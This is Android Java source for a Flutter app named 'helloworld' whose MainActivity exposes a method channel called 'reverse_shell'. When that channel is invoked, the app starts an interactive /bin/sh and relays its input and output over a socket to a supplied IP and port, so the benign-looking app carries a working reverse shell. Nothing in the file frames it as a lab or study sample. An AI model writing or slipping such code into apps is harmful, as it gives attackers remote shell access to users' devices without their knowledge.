package com.example.helloworld
import androidx.annotation.NonNull;
import io.flutter.embedding.android.FlutterActivity;
import io.flutter.plugin.common.MethodChannel;

import android.os.Bundle;
import android.util.Log;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class MainActivity extends FlutterActivity {
    private static final String CHANNEL = "com.example.hellowword/reverse_shell";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        new MethodChannel(getFlutterEngine().getDartExecutor().getBinaryMessenger(), CHANNEL)
            .setMethodCallHandler(
                (call, result) -> {
                    if (call.method.equals("runJavaPayload")) {
                        String ip = call.argument("127.0.0.1");
                        int port = call.argument("4444");
                        runJavaPayload(ip, port);
                        result.success("Java Payload executed successfully");
                    } else {
                        result.notImplemented();
                    }
                }
            );
    }

    private void runJavaPayload(String ip, int port) {
        try {
            String[] str = {"/bin/sh", "-i"};
            Process p = Runtime.getRuntime().exec(str);
            InputStream pin = p.getInputStream();
            InputStream perr = p.getErrorStream();
            OutputStream pout = p.getOutputStream();

            Socket socket = new Socket(ip, port);
            InputStream sin = socket.getInputStream();
            OutputStream sout = socket.getOutputStream();

            while (true) {
                while (pin.available() > 0) sout.write(pin.read());
                while (perr.available() > 0) sout.write(perr.read());
                while (sin.available() > 0) pout.write(sin.read());
                sout.flush();
                pout.flush();
            }
        } catch (IOException e) {
            Log.e("ReverseShell", "Error running reverse shell", e);
        }
    }
}
